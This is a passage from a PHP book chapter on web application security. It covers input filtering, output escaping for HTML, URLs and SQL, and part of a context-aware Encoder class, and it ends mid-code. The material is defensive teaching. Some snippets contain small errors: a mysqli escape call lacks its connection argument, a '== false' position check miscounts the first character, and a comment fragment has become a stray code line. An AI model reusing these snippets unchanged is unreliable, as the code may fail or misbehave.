<html><head></head><body><div id="sbo-rt-content"><section data-type="chapter" epub:type="chapter" data-pdf-bookmark="Chapter 14. Security"><div class="chapter" id="security">
<h1><span class="label">Chapter 14. </span>Security</h1>
<p><a contenteditable="false" data-type="indexterm" data-primary="security" id="ix_security_ch14"/>PHP is a flexible language with hooks into just about every API offered on the machines on which it runs. Because it was designed to be a forms-processing language for HTML pages, PHP makes it easy to use form data sent to a script. Convenience is a double-edged sword, however. The very features that allow you to quickly write programs in PHP can open doors for those who would break into your systems.</p>
<p>PHP itself is neither secure nor insecure. The security of your web applications is entirely determined by the code you write. For example, if a script opens a file whose name is passed to the script as a form parameter, that script could be given a remote URL, an absolute pathname, or even a relative path, allowing it to open a file outside the site’s document root. This could expose your password file or other sensitive information.</p>
<p>Web application security is still a relatively young and evolving discipline. A single chapter on security cannot sufficiently prepare you for the onslaught of attacks your applications are sure to receive. This chapter takes a pragmatic approach and covers a distilled selection of topics related to security, including how to protect your applications from the most common and dangerous attacks. The chapter concludes with a list of further resources as well as a brief recap with a few additional tips.</p>
<section data-type="sect1" data-pdf-bookmark="Safeguards"><div class="sect1" id="safeguards">
<h1>Safeguards</h1>
<p><a contenteditable="false" data-type="indexterm" data-primary="filtering input" id="ix_filtering_input_security"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="filtering input" id="ix_security_filtering"/>One of the most fundamental things you need to understand when developing a secure site is that all information not generated within the application itself is potentially tainted, or at least suspect. This includes data from forms, files, and databases. There should always be protections or safeguards in place.</p>
<section data-type="sect2" data-pdf-bookmark="Filtering Input"><div class="sect2" id="filtering_input">
<h2>Filtering Input</h2>
<p>When data is described as being tainted, this doesn’t necessarily mean it’s malicious. It means it <em>might be</em> malicious. You can’t trust the source, so you should inspect it to make sure it’s valid. This inspection process is called <em>filtering</em>, and you only want to allow valid data to enter your application.</p>
<p>There are a few best practices for the filtering process:</p>
<ul>
<li><p>Use a whitelist approach. This means you err on the side of caution and assume data is invalid unless you can prove it to be valid.</p></li>
<li><p>Never correct invalid data. History has proven that attempts to correct invalid data often result in security vulnerabilities due to errors.</p></li>
<li><p>Use a naming convention to help distinguish between filtered and tainted data. Filtering is useless if you can’t reliably determine whether something has been <span class="keep-together">filtered.</span></p></li>
</ul>
<p>In order to solidify these concepts, consider a simple HTML form allowing a user to select among three colors:</p>
<pre data-type="programlisting" data-code-language="html+php"><code class="nt">&lt;form</code> <code class="na">action=</code><code class="s">"process.php"</code> <code class="na">method=</code><code class="s">"POST"</code><code class="nt">&gt;</code>
 <code class="nt">&lt;p&gt;</code>Please select a color:

 <code class="nt">&lt;select</code> <code class="na">name=</code><code class="s">"color"</code><code class="nt">&gt;</code>
 <code class="nt">&lt;option</code> <code class="na">value=</code><code class="s">"red"</code><code class="nt">&gt;</code>red<code class="nt">&lt;/option&gt;</code>
 <code class="nt">&lt;option</code> <code class="na">value=</code><code class="s">"green"</code><code class="nt">&gt;</code>green<code class="nt">&lt;/option&gt;</code>
 <code class="nt">&lt;option</code> <code class="na">value=</code><code class="s">"blue"</code><code class="nt">&gt;</code>blue<code class="nt">&lt;/option&gt;</code>
 <code class="nt">&lt;/select&gt;</code>

 <code class="nt">&lt;input</code> <code class="na">type=</code><code class="s">"submit"</code> <code class="nt">/&gt;&lt;/p&gt;</code>
<code class="nt">&lt;/form&gt;</code></pre>
<p>It’s easy to appreciate the desire to trust <code>$_POST['color']</code> in <em>process.php</em>. After all, the form seemingly restricts what a user can enter. However, experienced developers know that HTTP requests have no restriction on the fields they contain—client-side validation is never sufficient by itself. There are numerous ways malicious data can be sent to your application, and your only defense is to trust nothing and filter your input:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$clean</code> <code class="o">=</code> <code class="k">array</code><code class="p">();</code>

<code class="k">switch</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'color'</code><code class="p">])</code> <code class="p">{</code>
 <code class="k">case</code> <code class="s1">'red'</code><code class="o">:</code>
 <code class="k">case</code> <code class="s1">'green'</code><code class="o">:</code>
 <code class="k">case</code> <code class="s1">'blue'</code><code class="o">:</code>
 <code class="nv">$clean</code><code class="p">[</code><code class="s1">'color'</code><code class="p">]</code> <code class="o">=</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'color'</code><code class="p">];</code>
 <code class="k">break</code><code class="p">;</code>

 <code class="k">default</code><code class="o">:</code>
 <code class="cm">/* ERROR */</code>
 <code class="k">break</code><code class="p">;</code>
<code class="p">}</code></pre>
<p>This example demonstrates a simple naming convention. You initialize an array called <code>$clean</code>. For each input field, validate the input and store the validated input in the array. This reduces the likelihood of tainted data being mistaken for filtered data, because you should always err on the side of caution and consider everything not stored in this array to be tainted.</p>
<p>Your filtering logic depends entirely upon the type of data you’re inspecting, and the more restrictive you can be, the better. For example, consider a registration form that asks the user to provide a desired username. Clearly, there are many possible usernames, so the previous example doesn’t help. In these cases, the best approach is to filter based on format. If you want to require a username to be alphanumeric (consisting of only alphabetic and numeric characters), your filtering logic can enforce this:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$clean</code> <code class="o">=</code> <code class="k">array</code><code class="p">();</code>

<code class="k">if</code> <code class="p">(</code><code class="nb">ctype_alnum</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]))</code> <code class="p">{</code>
 <code class="nv">$clean</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code> <code class="o">=</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">];</code>
<code class="p">}</code>
<code class="k">else</code> <code class="p">{</code>
 <code class="cm">/* ERROR */</code>
<code class="p">}</code></pre>
<p>Of course, this doesn’t ensure any particular length. Use <a contenteditable="false" data-type="indexterm" data-primary="mb_strlen function" id="idm45922751400184"/><code>mb_strlen()</code> to inspect a string’s length and enforce a minimum and maximum:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$clean</code> <code class="o">=</code> <code class="k">array</code><code class="p">();</code>

<code class="nv">$length</code> <code class="o">=</code> <code class="nb">mb_strlen</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]);</code>

<code class="k">if</code> <code class="p">(</code><code class="nb">ctype_alnum</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">])</code> <code class="o">&amp;&amp;</code> <code class="p">(</code><code class="nv">$length</code> <code class="o">&gt;</code> <code class="mi">0</code><code class="p">)</code> <code class="o">&amp;&amp;</code> <code class="p">(</code><code class="nv">$length</code> <code class="o">&lt;=</code> <code class="mi">32</code><code class="p">))</code> <code class="p">{</code>
 <code class="nv">$clean</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code> <code class="o">=</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">];</code>
<code class="p">}</code>
<code class="k">else</code> <code class="p">{</code>
 <code class="cm">/* ERROR */</code>
<code class="p">}</code></pre>
<p>Frequently, the characters you want to allow don’t all belong to a single group (such as alphanumeric), and this is where regular expressions can help. For example, consider the following filtering logic for a last name:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$clean</code> <code class="o">=</code> <code class="k">array</code><code class="p">();</code>

<code class="k">if</code> <code class="p">(</code><code class="nb">preg_match</code><code class="p">(</code><code class="s2">"/[^A-Za-z \'\-]/"</code><code class="p">,</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'last_name'</code><code class="p">]))</code> <code class="p">{</code>
 <code class="cm">/* ERROR */</code>
<code class="p">}</code>
<code class="k">else</code> <code class="p">{</code>
 <code class="nv">$clean</code><code class="p">[</code><code class="s1">'last_name'</code><code class="p">]</code> <code class="o">=</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'last_name'</code><code class="p">];</code>
<code class="p">}</code></pre>
<p>This filter allows only alphabetic characters, spaces, hyphens, and single quotes (apostrophes), and it uses a whitelist approach as described earlier. In this case, the whitelist is the list of valid characters.</p>
<p>In general, filtering is a process that ensures the integrity of your data. But while many web application security vulnerabilities can be prevented by filtering, most are due to a failure to escape data, and neither safeguard is a substitute for the other.<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_security_filtering" id="idm45922751065048"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_filtering_input_security" id="idm45922751063800"/></p>
</div></section>
<section data-type="sect2" data-pdf-bookmark="Escaping Output Data"><div class="sect2" id="escaping_output_data">
<h2>Escaping Output Data</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="escaping output data" id="ix_escaping_output_security"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="escaping output data" id="ix_security_escaping_output"/><em>Escaping</em> is a technique that preserves data as it enters another context. PHP is frequently used as a bridge between disparate data sources, and when you send data to a remote source, it’s your responsibility to prepare it properly so that it’s not <span class="keep-together">misinterpreted.</span></p>
<p><a contenteditable="false" data-type="indexterm" data-primary="databases" data-secondary="protecting" id="ix_databases_escaping_data"/>For example, <code>O'Reilly</code> is represented as <code>O\'Reilly</code> when used in an SQL query to be sent to a MySQL database. The backslash preserves the single quote (apostrophe) in the context of the SQL query. The single quote is part of the data, not part of the query, and the escaping guarantees this interpretation.</p>
<p>The two predominant remote sources to which PHP applications send data are HTTP clients (web browsers) that interpret HTML, JavaScript, and other client-side technologies, and databases that interpret SQL. For the former, PHP provides <a contenteditable="false" data-type="indexterm" data-primary="htmlentities function" id="idm45922751052552"/><code>html</code><span class="keep-together"><code>entities()</code></span>:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$html</code> <code class="o">=</code> <code class="k">array</code><code class="p">();</code>
<code class="nv">$html</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code> <code class="o">=</code> <code class="nb">htmlentities</code><code class="p">(</code><code class="nv">$clean</code><code class="p">[</code><code class="s1">'username'</code><code class="p">],</code> <code class="nx">ENT_QUOTES</code><code class="p">,</code> <code class="s1">'UTF-8'</code><code class="p">);</code>

<code class="k">echo</code> <code class="s2">"&lt;p&gt;Welcome back, </code><code class="si">{</code><code class="nv">$html</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code><code class="si">}</code><code class="s2">.&lt;/p&gt;"</code><code class="p">;</code></pre>
<p>This example demonstrates the use of another naming convention. The <code>$html</code> array is similar to the <code>$clean</code> array, except that its purpose is to hold data that is safe to be used in the context of HTML.</p>
<p>URLs are sometimes embedded in HTML as links:</p>
<pre data-type="programlisting" data-code-language="html+php"><code class="nt">&lt;a</code> <code class="na">href=</code><code class="s">"http://host/script.php?var={$value}"</code><code class="nt">&gt;</code>Click Here<code class="nt">&lt;/a&gt;</code></pre>
<p>In this particular example, <code>$value</code> exists within nested contexts. It’s within the query string of a URL that is embedded in HTML as a link. Because it’s alphabetic in this case, it’s safe to be used in both contexts. However, when the value of <code>$var</code> cannot be guaranteed to be safe in these contexts, it must be escaped twice:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$url</code> <code class="o">=</code> <code class="k">array</code><code class="p">(</code>
 <code class="s1">'value'</code> <code class="o">=&gt;</code> <code class="nb">urlencode</code><code class="p">(</code><code class="nv">$value</code><code class="p">),</code>
<code class="p">);</code>

<code class="nv">$link</code> <code class="o">=</code> <code class="s2">"http://host/script.php?var=</code><code class="si">{</code><code class="nv">$url</code><code class="p">[</code><code class="s1">'value'</code><code class="p">]</code><code class="si">}</code><code class="s2">"</code><code class="p">;</code>

<code class="nv">$html</code> <code class="o">=</code> <code class="k">array</code><code class="p">(</code>
 <code class="s1">'link'</code> <code class="o">=&gt;</code> <code class="nb">htmlentities</code><code class="p">(</code><code class="nv">$link</code><code class="p">,</code> <code class="nx">ENT_QUOTES</code><code class="p">,</code> <code class="s2">"UTF-8"</code><code class="p">),</code>
<code class="p">);</code>

<code class="k">echo</code> <code class="s2">"&lt;a href=</code><code class="se">\"</code><code class="si">{</code><code class="nv">$html</code><code class="p">[</code><code class="s1">'link'</code><code class="p">]</code><code class="si">}</code><code class="se">\"</code><code class="s2">&gt;Click Here&lt;/a&gt;"</code><code class="p">;</code></pre>
<p>This ensures that the link is safe to be used in the context of HTML, and when it is used as a URL (such as when the user clicks the link), the URL encoding ensures that the value of <code>$var</code> is preserved.</p>
<p>For most databases, there is a native escaping function specific to the database. For example, the MySQL extension provides <a contenteditable="false" data-type="indexterm" data-primary="mysqli_real_escape_string function" id="idm45922750870984"/><code>mysqli_real_escape_string()</code>:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$mysql</code> <code class="o">=</code> <code class="k">array</code><code class="p">(</code>
 <code class="s1">'username'</code> <code class="o">=&gt;</code> <code class="nx">mysqli_real_escape_string</code><code class="p">(</code><code class="nv">$clean</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]),</code>
<code class="p">);</code>

<code class="nv">$sql</code> <code class="o">=</code> <code class="s2">"SELECT * FROM profile</code>
<code class="s2"> WHERE username = '</code><code class="si">{</code><code class="nv">$mysql</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code><code class="si">}</code><code class="s2">'"</code><code class="p">;</code>

<code class="nv">$result</code> <code class="o">=</code> <code class="nb">mysql_query</code><code class="p">(</code><code class="nv">$sql</code><code class="p">);</code></pre>
<p>An even safer alternative is to use a database abstraction library that handles the escaping for you. The following illustrates this concept with <code>PEAR::DB</code>:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$sql</code> <code class="o">=</code> <code class="s2">"INSERT INTO users (last_name) VALUES (?)"</code><code class="p">;</code>

<code class="nv">$db</code><code class="o">-&gt;</code><code class="na">query</code><code class="p">(</code><code class="nv">$sql</code><code class="p">,</code> <code class="k">array</code><code class="p">(</code><code class="nv">$clean</code><code class="p">[</code><code class="s1">'last_name'</code><code class="p">]));</code></pre>
<p>Although this is not a complete example, it highlights the use of a placeholder (the question mark) in the SQL query. <code>PEAR::DB</code> properly quotes and escapes the data according to the requirements of your database. Take a look at <a data-type="xref" href="ch09.xhtml#databases-id00007">Chapter 9</a> for more in-depth coverage of placeholder techniques.<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_databases_escaping_data" id="idm45922750823000"/></p>
<p>A more complete output-escaping solution would include context-aware escaping for HTML elements, HTML attributes, JavaScript, CSS, and URL content, and would do so in a Unicode-safe manner. <a data-type="xref" href="#example_onefour_onedot_escaping_output">Example 14-1</a> shows a sample class for escaping output in a variety of contexts, based on the <a contenteditable="false" data-type="indexterm" data-primary="content-escaping rules" id="idm45922750769304"/><a href="https://oreil.ly/Xpu6q">content-escaping rules</a> defined by the <a contenteditable="false" data-type="indexterm" data-primary="Open Web Application Security Project" id="idm45922750767544"/><a contenteditable="false" data-type="indexterm" data-primary="website resources" data-secondary="Open Web Application Security Project" id="idm45922750766440"/>Open Web Application Security Project.<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_security_escaping_output" id="idm45922750764968"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_escaping_output_security" id="idm45922750763576"/></p>
<div data-type="example" id="example_onefour_onedot_escaping_output">
<h5><span class="label">Example 14-1. </span>Escaping output for multiple contexts</h5>
<pre data-type="programlisting" data-code-language="php"><code class="k">class</code> <code class="nc">Encoder</code>
<code class="p">{</code>
 <code class="k">const</code> <code class="no">ENCODE_STYLE_HTML</code> <code class="o">=</code> <code class="mi">0</code><code class="p">;</code>
 <code class="k">const</code> <code class="no">ENCODE_STYLE_JAVASCRIPT</code> <code class="o">=</code> <code class="mi">1</code><code class="p">;</code>
 <code class="k">const</code> <code class="no">ENCODE_STYLE_CSS</code> <code class="o">=</code> <code class="mi">2</code><code class="p">;</code>
 <code class="k">const</code> <code class="no">ENCODE_STYLE_URL</code> <code class="o">=</code> <code class="mi">3</code><code class="p">;</code>
 <code class="k">const</code> <code class="no">ENCODE_STYLE_URL_SPECIAL</code> <code class="o">=</code> <code class="mi">4</code><code class="p">;</code>

 <code class="k">private</code> <code class="k">static</code> <code class="nv">$URL_UNRESERVED_CHARS</code> <code class="o">=</code>
 <code class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz-_.~'</code><code class="p">;</code>

 <code class="k">public</code> <code class="k">function</code> <code class="nf">encodeForHTML</code><code class="p">(</code><code class="nv">$value</code><code class="p">)</code> <code class="p">{</code>
 <code class="nv">$value</code> <code class="o">=</code> <code class="nb">str_replace</code><code class="p">(</code><code class="s1">'&amp;'</code><code class="p">,</code> <code class="s1">'&amp;amp;'</code><code class="p">,</code> <code class="nv">$value</code><code class="p">);</code>
 <code class="nv">$value</code> <code class="o">=</code> <code class="nb">str_replace</code><code class="p">(</code><code class="s1">'&lt;'</code><code class="p">,</code> <code class="s1">'&amp;lt;'</code><code class="p">,</code> <code class="nv">$value</code><code class="p">);</code>
 <code class="nv">$value</code> <code class="o">=</code> <code class="nb">str_replace</code><code class="p">(</code><code class="s1">'&gt;'</code><code class="p">,</code> <code class="s1">'&amp;gt;'</code><code class="p">,</code> <code class="nv">$value</code><code class="p">);</code>
 <code class="nv">$value</code> <code class="o">=</code> <code class="nb">str_replace</code><code class="p">(</code><code class="s1">'"'</code><code class="p">,</code> <code class="s1">'&amp;quot;'</code><code class="p">,</code> <code class="nv">$value</code><code class="p">);</code>
 <code class="nv">$value</code> <code class="o">=</code> <code class="nb">str_replace</code><code class="p">(</code><code class="s1">'\''</code><code class="p">,</code> <code class="s1">'&amp;#x27;'</code><code class="p">,</code> <code class="nv">$value</code><code class="p">);</code> <code class="c1">// &amp;apos; is not recommended</code>
 <code class="nv">$value</code> <code class="o">=</code> <code class="nb">str_replace</code><code class="p">(</code><code class="s1">'/'</code><code class="p">,</code> <code class="s1">'&amp;#x2F;'</code><code class="p">,</code> <code class="nv">$value</code><code class="p">);</code> <code class="c1">// forward slash can help end </code>
 <code class="nx">HTML</code> <code class="nx">entity</code>

 <code class="k">return</code> <code class="nv">$value</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="k">public</code> <code class="k">function</code> <code class="nf">encodeForHTMLAttribute</code><code class="p">(</code><code class="nv">$value</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$this</code><code class="o">-&gt;</code><code class="na">_encodeString</code><code class="p">(</code><code class="nv">$value</code><code class="p">);</code>
 <code class="p">}</code>

 <code class="k">public</code> <code class="k">function</code> <code class="nf">encodeForJavascript</code><code class="p">(</code><code class="nv">$value</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$this</code><code class="o">-&gt;</code><code class="na">_encodeString</code><code class="p">(</code><code class="nv">$value</code><code class="p">,</code> <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_JAVASCRIPT</code><code class="p">);</code>
 <code class="p">}</code>

 <code class="k">public</code> <code class="k">function</code> <code class="nf">encodeForURL</code><code class="p">(</code><code class="nv">$value</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$this</code><code class="o">-&gt;</code><code class="na">_encodeString</code><code class="p">(</code><code class="nv">$value</code><code class="p">,</code> <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_URL_SPECIAL</code><code class="p">);</code>
 <code class="p">}</code>

 <code class="k">public</code> <code class="k">function</code> <code class="nf">encodeForCSS</code><code class="p">(</code><code class="nv">$value</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$this</code><code class="o">-&gt;</code><code class="na">_encodeString</code><code class="p">(</code><code class="nv">$value</code><code class="p">,</code> <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_CSS</code><code class="p">);</code>
 <code class="p">}</code>

 <code class="sd">/**</code>
<code class="sd"> * Encodes any special characters in the path portion of the URL. Does not</code>
<code class="sd"> * modify the forward slash used to denote directories. If your directory</code>
<code class="sd"> * names contain slashes (rare), use the plain urlencode on each directory</code>
<code class="sd"> * component and then join them together with a forward slash.</code>
<code class="sd"> *</code>
<code class="sd"> * Based on http://en.wikipedia.org/wiki/Percent-encoding and</code>
<code class="sd"> * http://tools.ietf.org/html/rfc3986</code>
<code class="sd"> */</code>
 <code class="k">public</code> <code class="k">function</code> <code class="nf">encodeURLPath</code><code class="p">(</code><code class="nv">$value</code><code class="p">)</code> <code class="p">{</code>
 <code class="nv">$length</code> <code class="o">=</code> <code class="nb">mb_strlen</code><code class="p">(</code><code class="nv">$value</code><code class="p">);</code>

 <code class="k">if</code> <code class="p">(</code><code class="nv">$length</code> <code class="o">==</code> <code class="mi">0</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$value</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="nv">$output</code> <code class="o">=</code> <code class="s1">''</code><code class="p">;</code>

 <code class="k">for</code> <code class="p">(</code><code class="nv">$i</code> <code class="o">=</code> <code class="mi">0</code><code class="p">;</code> <code class="nv">$i</code> <code class="o">&lt;</code> <code class="nv">$length</code><code class="p">;</code> <code class="nv">$i</code><code class="o">++</code><code class="p">)</code> <code class="p">{</code>
 <code class="nv">$char</code> <code class="o">=</code> <code class="nb">mb_substr</code><code class="p">(</code><code class="nv">$value</code><code class="p">,</code> <code class="nv">$i</code><code class="p">,</code> <code class="mi">1</code><code class="p">);</code>

 <code class="k">if</code> <code class="p">(</code><code class="nv">$char</code> <code class="o">==</code> <code class="s1">'/'</code><code class="p">)</code> <code class="p">{</code>
 <code class="c1">// Slashes are allowed in paths.</code>
 <code class="nv">$output</code> <code class="o">.=</code> <code class="nv">$char</code><code class="p">;</code>
 <code class="p">}</code>
 <code class="k">else</code> <code class="k">if</code> <code class="p">(</code><code class="nb">mb_strpos</code><code class="p">(</code><code class="nx">self</code><code class="o">::</code><code class="nv">$URL_UNRESERVED_CHARS</code><code class="p">,</code> <code class="nv">$char</code><code class="p">)</code> <code class="o">==</code> <code class="k">false</code><code class="p">)</code> <code class="p">{</code>
 <code class="c1">// It's not in the unreserved list so it needs to be encoded.</code>
 <code class="nv">$output</code> <code class="o">.=</code> <code class="nv">$this</code><code class="o">-&gt;</code><code class="na">_encodeCharacter</code><code class="p">(</code><code class="nv">$char</code><code class="p">,</code> <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_URL</code><code class="p">);</code>
 <code class="p">}</code>
 <code class="k">else</code> <code class="p">{</code>
 <code class="c1">// It's in the unreserved list so let it through.</code>
 <code class="nv">$output</code> <code class="o">.=</code> <code class="nv">$char</code><code class="p">;</code>
 <code class="p">}</code>
 <code class="p">}</code>

 <code class="k">return</code> <code class="nv">$output</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="k">private</code> <code class="k">function</code> <code class="nf">_encodeString</code><code class="p">(</code><code class="nv">$value</code><code class="p">,</code> <code class="nv">$style</code> <code class="o">=</code> <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_HTML</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">if</code> <code class="p">(</code><code class="nb">mb_strlen</code><code class="p">(</code><code class="nv">$value</code><code class="p">)</code> <code class="o">==</code> <code class="mi">0</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$value</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="nv">$characters</code> <code class="o">=</code> <code class="nb">preg_split</code><code class="p">(</code><code class="s1">'/(?&lt;!^)(?!$)/u'</code><code class="p">,</code> <code class="nv">$value</code><code class="p">);</code>
 <code class="nv">$output</code> <code class="o">=</code> <code class="s1">''</code><code class="p">;</code>

 <code class="k">foreach</code> <code class="p">(</code><code class="nv">$characters</code> <code class="k">as</code> <code class="nv">$c</code><code class="p">)</code> <code class="p">{</code>
 <code class="nv">$output</code> <code class="o">.=</code> <code class="nv">$this</code><code class="o">-&gt;</code><code class="na">_encodeCharacter</code><code class="p">(</code><code class="nv">$c</code><code class="p">,</code> <code class="nv">$style</code><code class="p">);</code>
 <code class="p">}</code>

 <code class="k">return</code> <code class="nv">$output</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="k">private</code> <code class="k">function</code> <code class="nf">_encodeCharacter</code><code class="p">(</code><code class="nv">$c</code><code class="p">,</code> <code class="nv">$style</code> <code class="o">=</code> <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_HTML</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">if</code> <code class="p">(</code><code class="nb">ctype_alnum</code><code class="p">(</code><code class="nv">$c</code><code class="p">))</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$c</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="k">if</code> <code class="p">((</code><code class="nv">$style</code> <code class="o">===</code> <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_URL_SPECIAL</code><code class="p">)</code> <code class="o">&amp;&amp;</code> <code class="p">(</code><code class="nv">$c</code> <code class="o">==</code> <code class="s1">'/'</code> <code class="o">||</code> <code class="nv">$c</code> <code class="o">==</code> <code class="s1">':'</code><code class="p">))</code> <code class="p">{</code>
 <code class="k">return</code> <code class="nv">$c</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="nv">$charCode</code> <code class="o">=</code> <code class="nv">$this</code><code class="o">-&gt;</code><code class="na">_unicodeOrdinal</code><code class="p">(</code><code class="nv">$c</code><code class="p">);</code>

 <code class="nv">$prefixes</code> <code class="o">=</code> <code class="k">array</code><code class="p">(</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_HTML</code> <code class="o">=&gt;</code> <code class="k">array</code><code class="p">(</code><code class="s1">'&amp;#x'</code><code class="p">,</code> <code class="s1">'&amp;#x'</code><code class="p">),</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_JAVASCRIPT</code> <code class="o">=&gt;</code> <code class="k">array</code><code class="p">(</code><code class="s1">'\\x'</code><code class="p">,</code> <code class="s1">'\\u'</code><code class="p">),</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_CSS</code> <code class="o">=&gt;</code> <code class="k">array</code><code class="p">(</code><code class="s1">'\\'</code><code class="p">,</code> <code class="s1">'\\'</code><code class="p">),</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_URL</code> <code class="o">=&gt;</code> <code class="k">array</code><code class="p">(</code><code class="s1">'%'</code><code class="p">,</code> <code class="s1">'%'</code><code class="p">),</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_URL_SPECIAL</code> <code class="o">=&gt;</code> <code class="k">array</code><code class="p">(</code><code class="s1">'%'</code><code class="p">,</code> <code class="s1">'%'</code><code class="p">),</code>
 <code class="p">);</code>

 <code class="nv">$suffixes</code> <code class="o">=</code> <code class="k">array</code><code class="p">(</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_HTML</code> <code class="o">=&gt;</code> <code class="s1">';'</code><code class="p">,</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_JAVASCRIPT</code> <code class="o">=&gt;</code> <code class="s1">''</code><code class="p">,</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_CSS</code> <code class="o">=&gt;</code> <code class="s1">''</code><code class="p">,</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_URL</code> <code class="o">=&gt;</code> <code class="s1">''</code><code class="p">,</code>
 <code class="nx">self</code><code class="o">::</code><code class="na">ENCODE_STYLE_URL_SPECIAL</code> <code class="o">=&gt;</code> <code class="s1">''</code><code class="p">,</code>
 <code class="p">);</code>

 <code class="c1">// if ASCII, encode with \\xHH</code>
 <code class="k">if</code> <code class="p">(</code><code class="nv">$charCode</code> <code class="o">&lt;</code> <code class="mi">256</code><code class="p">)</code> <code class="p">{</code>
 <code class="nv">$prefix</code> <code class="o">=</code> <code class="nv">$prefixes</code><code class="p">[</code><code class="nv">$style</code><code class="p">][</code><code class="mi">0</code><code class="p">];</code>
 <code class="nv">$suffix</code> <code class="o">=</code> <code class="nv">$suffixes</code><code class="p">[</code><code class="nv">$style</code><code class="p">];</code>

 <code class="k">return</code> <code class="nv">$prefix</code> <code class="o">.</code> <code class="nb">str_pad</code><code class="p">(</code><code class="nb">strtoupper</code><code class="p">(</code><code class="nb">dechex</code><code class="p">(</code><code class="nv">$charCode</code><code class="p">)),</code> <code class="mi">2</code><code class="p">,</code> <code class="s1">'0'</code><code class="p">)</code> <code class="o">.</code> <code class="nv">$suffix</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="c1">// otherwise encode with \\uHHHH</code>
 <code class="nv">$prefix</code> <code class="o">=</code> <code class="nv">$prefixes</code><code class="p">[</code><code class="nv">$style</code><code class="p">][</code><code class="mi">1</code><code class="p">];</code>
 <code class="nv">$suffix</code> <code class="o">=</code> <code class="nv">$suffixes</code><code class="p">[</code><code class="nv">$style</code><code class="p">];</code>

 <code class="k">return</code> <code class="nv">$prefix</code> <code class="o">.</code> <code class="nb">str_pad</code><code class="p">(</code><code class="nb">strtoupper</code><code class="p">(</code><code class="nb">dechex</code><code class="p">(</code><code class="nv">$charCode</code><code class="p">)),</code> <code class="mi">4</code><code class="p">,</code> <code class="s1">'0'</code><code class="p">)</code> <code class="o">.</code> <code class="nv">$suffix</code><code class="p">;</code>
 <code class="p">}</code>

 <code class="k">private</code> <code class="k">function</code> <code class="nf">_unicodeOrdinal</code><code class="p">(</code><code class="nv">$u</code><code class="p">)</code> <code class="p">{</code>
 <code class="nv">$c</code> <code class="o">=</code> <code class="nb">mb_convert_encoding</code><code class="p">(</code><code class="nv">$u</code><code class="p">,</code> <code class="s1">'UCS-2LE'</code><code class="p">,</code> <code class="s1">'UTF-8'</code><code class="p">);</code>
